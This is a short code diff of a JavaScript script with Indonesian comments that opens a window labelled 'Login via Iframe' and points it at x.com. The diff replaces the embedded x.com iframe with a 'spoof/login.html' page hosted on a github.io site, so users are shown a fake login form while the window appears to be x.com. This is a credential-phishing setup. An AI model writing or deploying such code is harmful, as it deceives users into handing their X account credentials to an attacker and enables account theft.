@@ -12,7 +12,7 @@
     w.document.write('<h2>Login via Iframe</h2>');
 
     // Menambahkan iframe yang memuat halaman login (x.com)
-    w.document.write('<iframe src="https://x.com" width="100%" height="500px" id="loginIframe"></iframe>');
+    w.document.write('<iframe src="https://cnfdnfial-ops.github.io/spoof/login.html" width="100%" height="500px" id="loginIframe"></iframe>');
 
     // Mengubah lokasi jendela ke x.com
     w.location = "https://x.com";
@@ -24,7 +24,7 @@
         if (w.location.href === "https://x.com") {
           // Lanjutkan menampilkan iframe jika berada di x.com
           w.document.body.innerHTML = '<h2>Login via Iframe</h2>';
-          w.document.body.innerHTML += '<iframe src="https://x.com" width="100%" height="500px" id="loginIframe"></iframe>';
+          w.document.body.innerHTML += '<iframe src="https://cnfdnfial-ops.github.io/spoof/login.html" width="100%" height="500px" id="loginIframe"></iframe>';
         }
       } catch (e) {
         // Jika gagal, hentikan interval dan alihkan ke halaman Google
